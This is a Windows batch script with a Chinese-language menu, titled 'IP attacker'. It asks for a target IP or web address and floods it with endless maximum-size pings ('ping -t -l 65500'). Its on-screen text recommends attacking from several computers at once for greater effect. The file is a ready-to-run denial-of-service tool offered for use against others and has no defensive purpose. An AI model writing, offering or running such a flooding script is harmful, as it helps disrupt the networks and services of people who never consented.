@echo off
mode con: cols=40 lines=25
title IP攻击器
:menu
color 0A
@echo.
@echo ╭——————╮
@echo │★IP攻击器★│
@echo ╰——————╯
@echo ========================================
set /p ip=请输入对方IP或网址：
@echo ========================================
@echo.
@echo ★按任意键开始攻击,关闭窗口停止!★
pause >nul
cls
color 9F
@echo.
@echo ☆正在攻击%ip%中!☆
@echo.
@echo ========================================
@echo 建议:使用多台电脑同时攻击效果更佳!
@echo.
@echo "Request Timed Out"说明对方拒绝接收你发给它的数据包,大多数的原因可能是对方装有防火墙或已下线!
@echo.
@echo "Bad IP address"说明你的IP地址或网址输入错误!
@echo ========================================
@echo.
ping -t -l 65500 %ip%